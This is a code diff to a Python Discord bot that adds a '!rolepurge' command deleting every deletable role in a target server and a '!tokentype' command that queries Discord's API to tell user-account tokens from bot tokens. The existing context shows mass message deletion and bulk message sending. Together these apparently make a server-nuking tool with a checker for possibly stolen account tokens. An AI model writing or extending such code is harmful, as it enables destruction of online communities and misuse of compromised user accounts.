@@ -1,16 +1,32 @@
 import discord
 import asyncio
+import requests
 from discord.ext import commands
 
 # Replace TOKEN with your Discord bot token
-TOKEN = 'URTOKEN'
-YOURUSERID = 'URUSERID'
+TOKEN = ''
+YOURUSERID = ''
 
-intents = discord.Intents.default()
-intents.guilds = True
-intents.members = True
+intents = discord.Intents.all()
+
 
 bot = commands.Bot(command_prefix='!', intents=intents)
+
+
+def check_token_type(token):
+    headers = {
+        'Authorization': token
+    }
+    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
+    
+    if response.status_code == 200:
+        data = response.json()
+        if 'bot' in data:
+            return 'Bot'
+        else:
+            return 'Account'
+    else:
+        return 'Invalid/Bot'
 
 
 
@@ -138,6 +154,8 @@ async def helpme(ctx):
     help_embed.add_field(name='Clear', value='Deletes all messages sent by the bot\n`!clear <serverid>`', inline=False)
     help_embed.add_field(name='Clear Channel', value='Deletes all messages in a channel\n`!clearchannel <serverid> <channelid>`', inline=False)
     help_embed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
+    help_embed.add_field(name='Role Purge', value='`!rolepurge <serverid>`', inline=False)
+    help_embed.add_field(name='Token Type', value='`!tokentype <token>`', inline=False)
 
     await ctx.send(embed=help_embed)
 
@@ -225,6 +243,39 @@ async def clearchannel(ctx, server_id: int, channel_id: int):
         await ctx.send(f"All messages in channel **{channel.name}** have been deleted.")
     except discord.errors.Forbidden:
         await ctx.send("I don't have permissions in the server.")
+
+
+@bot.command()
+async def rolepurge(ctx, server_id):
+    try:
+        guild = bot.get_guild(int(server_id))
+        if guild is None:
+            await ctx.send("Invalid server ID or bot is not a member of the server.")
+            return
+
+        roles = guild.roles
+        bot_role = guild.get_member(bot.user.id).top_role
+
+        for role in roles:
+            if role.name != "@everyone" and role != bot_role:
+                await role.delete()
+        
+        await ctx.send("All deletable roles have been deleted.")
+    except discord.errors.Forbidden:
+        await ctx.send("Insufficient permissions to delete roles.")
+    except ValueError:
+        await ctx.send("Invalid server ID format.")
+
+@bot.command()
+async def tokentype(ctx, token):
+    if check_token_type(token) == 'Account':
+        await ctx.send("Account token.")
+    else:
+        await ctx.send("Bot/Invalid.")
+    
+    
+
+
 
 
 async def send_messages(channel, num_messages, message_content):
